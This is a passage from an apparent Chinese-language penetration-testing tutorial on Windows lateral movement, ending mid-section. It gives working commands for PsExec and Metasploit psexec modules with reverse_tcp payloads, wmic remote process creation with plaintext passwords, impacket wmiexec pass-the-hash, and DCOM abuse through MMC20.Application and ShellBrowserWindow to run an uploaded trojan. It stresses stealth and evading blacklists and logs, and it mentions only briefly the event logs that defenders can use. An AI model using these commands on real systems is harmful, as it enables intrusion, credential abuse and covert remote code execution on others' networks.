使用如下命令：
  * -accepteula：第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框
  * -u：用户名
  * -p：密码
  * -s：以system权限运行运程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个连接所用用户权限的shell
    PsExec64.exe -accepteula \\192.168.10.3 -u WIN-U8TRGT93CTR\administrator -p  -s cmd.exe
这里也可以先建立ipc连接后直接调用`PsExec64.exe`调用cmd
    net use \\192.168.10.3\ipc$  /user:administrator
    PsExec64.exe -accepteula \\192.168.10.3 cmd.exe
也可以直接执行命令(在建立ipc连接的基础上)
    PsExec64.exe -accepteula \\192.168.10.3 ipconfig
### msf中的psexec
使用`search psexec`寻找`psexec`模块如下图所示
这里最常用的有以下模块
    exploit/windows/smb/psexec
    exploit/windows/smb/ms17_10_psexec
这里说一下msf里面的这个`psexec`这个模块跟`powershell`原生模块的区别。我们知道`powershell`是在2008及以上的系统才有，在2008及以上的系统使用原生`powershell`免杀效果是要比msf里`psexec`生成的`payload`要好的。但是在2003及以下的版本是不自带`powershell`的，那么在这种情况下我们就只能使用msf的`psexec`生成的exe进行横向移动
这里唯一一点注意的就是msf的`payload`，需要用到反弹`payload`，即`reverse_tcp`
运行可以看到为system权限
psexec服务将会安装在远程系统中，此时将会生成 Event 4697、7045 这2种事件日志；有可能预生成Event 4624和Event 4652
Windows事件日志，日志会记录下该工具的使用数据。
## 利用WMI
> `WMI`，是Windows
> 2K/XP管理系统的核心；对于其他的`Win32`操作系统，`WMI`是一个有用的插件。`WMI`以`CIMOM`为基础，`CIMOM`即公共信息模型对象管理器（Common
> Information Model Object
> Manager），是一个描述操作系统构成单元的对象数据库，为`MMC`和脚本程序提供了一个访问操作系统构成单元的公共接口。有了`WMI`，工具软件和脚本程序访问操作系统的不同部分时不需要使用不同的API；相反，操作系统的不同部分都可以插入`WMI`
由于刚刚提到的`PsExec`在内网中大杀四方后，很多安全厂商开始将`PsExec`加入了黑名单，所以攻击者暴露的可能性陡然增加。但是根据研究情况来看，Windows操作系统默认不会将`WMI`的操作记录到日志当中，而且因为采用的是无文件攻击，所以导致WMI具有极高的隐蔽性。由此，越来越多的APT开始使用`WMI`进行攻击，利用`WMI`可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。
使用 `wmic` 远程执行命令，在远程系统中启动 `Windows Mannagement Instrumentation` 服务（目标服务器需要开放
135 端口，wmic 会以管理员权限在远程系统中执行命令）
### 查询进程信息
    wmic /node:192.168.52.138 /user:administrator /password:qwe123!@# process list brief
### 远程创建进程
`wmic`也可以用来调用`cmd`执行系统命令，跟`at`命令类似，`wmic`调用cmd的时候也是没有回显的，所以我们还是写入txt用type命令进行查看
    wmic /node:192.168.52.138 /user:administrator /password:qwe123!@# process call create "cmd.exe /c ipconfig > C:\result.txt"
使用type命令读取写入txt的结果如图所示
## wmiexec
`wmiexec`是windows自带的`wmic`的加强版，在渗透过程中使用`wmiexec`会比`wmic`和`psexec`更加方便，这里就介绍几种常用的`wmiexec`工具进行渗透。
### impacket中的wmiexec.py
首先在github上下载`impacket`安装包：
使用命令
    python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP    // 哈希传递获得shell
    python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP "ipconfig"   // 执行命令
注意：对于运行时间较长的命令，例如`ping`、`systeminfo`等，需要添加`-wait 5000`或更长时间的参数。
由于正常的命令都要查看结果，所以执行的命令后面都会加上重定向符，把结果输出到文件中。所以`wmiexec.vbs`在运行nc反弹shell或者msf木马木马等不需要输出结果但需要一直运行的程序时，因为木马进程会一直存在，导致结果文件被占用，不能删除，也不能改写。出现这种情况后由于结果文件被占用，所以`WMIEXEC`不能工作，除非手动更改脚本中的结果文件名。或者可以用taskkill
远程结束掉卡死的进程，然后`WMIEXEC`可以恢复工作。为了解决这个问题，加入了“-persist” 选项。
当命令加了“`-persist`” 选项后，程序会在后台运行，不会有结果输出，而且会返回这个命令进程的PID，方便结束进程。
### wmiexec.vbs
`wmiexec.vbs` 可以在远程系统中执行命令并进行回显，获得远程主机的半交互式shell
    cscript.exe //nologo wmiexec.vbs /shell 192.168.10.3 administrator 
输入如下命令，使用 `wmiexec.vbs` 在远程主机上执行单条命令
    cscript.exe //nologo wmiexec.vbs /cmd 192.168.10.3 administrator  "命令"
### Invoke-WMIMethod
利用 `PowerShell` 自带的 `Invoke-WMIMethod`，可以在远程系统主机上执行命令和指定程序
    #目标系统用户名
    $User = "WIN-U8TRGT93CTR\administrator"
    #目标系统密码
    $Password= ConvertTo-SecureString -String "qwe123!@#" -AsPlainText -Force
    #账号密码整合，导入Credential
    $Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User , $Password
    #远程运行计算器程序
    Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName "192.168.10.3" -Credential $Cred
这时候靶机进程就会出现`calc.exe`
## 利用DCOM
此部分主要参考了三好学生大佬的文章：[域渗透-利用DCOM在远程系统执行程序](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8DCOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F)，在此对三好学生大佬表示衷心感谢。
这里先提两个概念，`COM`和`DCOM`
> `COM`即组件对象模型(Component Object Model，`COM`) ，是基于 Windows 平台的一套 **组件对象接口标准**
> ，由一组 **构造规范** 和 **组件对象库** 组成。`COM`是许多微软产品和技术，如Windows媒体播放器和Windows
> Server的基础。一般的对象是由数据成员和作用在其上的方法组成，而组件对象和一般对象虽有相似性，但又有较大不同。组件对象不使用方法而用接口来描述自身。接口被定义为“在对象上实现的一组语义上相关的功能”，其实质是一组函数指针表，每个指针必须初始化指向某个具体的函数体，一个组件对象实现的接口数量没有限制。
关于这个`COM`，其实应该有很多师傅见过，那就是在windows情况下`php`为数不多的几种`disable_functions`的方法之一，就是利用windows的`COM`组件进行绕过，这里我就不往深处拓展了
>
> `DCOM`（分布式组件对象模型）是微软基于组件对象模型（`COM`）的一系列概念和程序接口，它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是Internet上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。DCOM是COM（组件对象模型）的扩展，它允许应用程序实例化和访问远程计算机上COM对象的属性和方法。DCOM
> 使用远程过程调用（RPC）技术将组件对象模型（COM）的功能扩展到本地计算机之外，因此，在远程系统上托管COM服务器端的软件（通常在DLL或exe中）可以通过RPC向客户端公开其方法。
攻击者可使用 `DCOM` 进行横向移动，通过 `DCOM`，攻击者可在拥有适当权限的情况下通过 Office 应用程序以及包含不安全方法的其他
Windows 对象远程执行命令。
使用`DCOM`进行横向移动的优势之一在于， **在远程主机上执行的进程将会是托管COM服务器端的软件**
。例如我们滥用`ShellBrowserWindow
COM`对象，那么就会在远程主机的现有`explorer.exe`进程中执行。对攻击者而言，这无疑能够增强隐蔽性，由于有大量程序都会向`DCOM`公开方法，因此防御者可能难以全面监测所有程序的执行。
这里利用`DCOM`进行横向移动有两个条件：
    1.能关闭靶机防火墙
    2.拥有cmdshell、靶机需要使用administrator账户
`DCOM`进行横向移动的操作如下：
1.与靶机建立ipc连接
2.cs生成木马使用copy命令上传到靶机
3.调用`DCOM`远程执行命令
### 调用MMC20.Application远程执行命令
通过`PowerShell`与`DCOM`进行远程交互，此外，我们只需要提供一个`DCOM
ProgID`和一个IP地址，然后，它就从远程返回一个`COM对象`的实例。
    $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.52.138))
    $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c c:\shell.exe","Minimized")
执行以上命令我们就可以调用`ExecuteShellCommand`方法在远程主机上启动进程
### 调用9BA05972-F6A8-11CF-A442-00A0C90A8F39
通过调用`9BA05972-F6A8-11CF-A442-00A0C90A8F39`来执行exe文件
    $com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.52.138")
    $obj = [System.Activator]::CreateInstance($com)
    $item = $obj.item()
    $item.Document.Application.ShellExecute("cmd.exe","/c c:\shell.exe","c:\windows\system32",$null,0)
### 调用Excel.Application远程执行命令
    # 通过PowerShell与DCOM进行远程交互，创建Excel.Application对象的实例: